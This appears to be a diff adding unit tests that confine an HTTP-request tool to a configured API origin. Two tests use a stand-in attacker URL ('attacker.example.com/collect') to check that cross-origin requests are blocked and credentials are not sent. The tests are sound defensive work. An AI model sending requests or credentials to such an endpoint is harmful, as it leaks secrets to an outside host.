@@ -132,4 +132,54 @@ describe('ApiRequestTools', () => {
       expect(result.text).not.toMatch(/suppressed/);
     });
   });
+
+  describe('http_request — origin scoping (baseUrl passed to constructor)', () => {
+    it('allows a relative path — resolves within the configured origin', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false, 'https://api.example.com');
+      const result = await tools.dispatch('http_request', { method: 'GET', url: '/api/users' });
+      expect(context.fetch).toHaveBeenCalledWith('/api/users', expect.anything());
+      expect(result.ok).toBe(true);
+    });
+
+    it('allows an absolute URL that matches the configured origin exactly', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false, 'https://api.example.com');
+      const result = await tools.dispatch('http_request', { method: 'GET', url: 'https://api.example.com/api/users' });
+      expect(context.fetch).toHaveBeenCalled();
+      expect(result.ok).toBe(true);
+    });
+
+    it('blocks an absolute URL to a different host, never calling the real context', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false, 'https://api.example.com');
+      const result = await tools.dispatch('http_request', { method: 'GET', url: 'https://attacker.example.com/collect' });
+      expect(context.fetch).not.toHaveBeenCalled();
+      expect(result.ok).toBe(false);
+      expect(result.text).toMatch(/outside the API under test/);
+    });
+
+    it('blocks a different scheme/port on the same hostname — origin, not just hostname, must match', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false, 'https://api.example.com');
+      const result = await tools.dispatch('http_request', { method: 'GET', url: 'https://api.example.com:8443/api/users' });
+      expect(context.fetch).not.toHaveBeenCalled();
+      expect(result.ok).toBe(false);
+    });
+
+    it('does not leak the configured credential to a blocked host — dispatch never calls fetch, so extraHTTPHeaders never sends', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false, 'https://api.example.com');
+      await tools.dispatch('http_request', { method: 'GET', url: 'https://attacker.example.com/collect' });
+      expect(context.fetch).not.toHaveBeenCalled();
+    });
+
+    it('is unenforced when no baseUrl is passed — existing callers with no fixed base are unaffected', async () => {
+      const context = fakeContext(fakeResponse());
+      const tools = new ApiRequestTools(context, false);
+      const result = await tools.dispatch('http_request', { method: 'GET', url: 'https://anywhere.example.com/x' });
+      expect(context.fetch).toHaveBeenCalled();
+      expect(result.ok).toBe(true);
+    });
+  });
 });
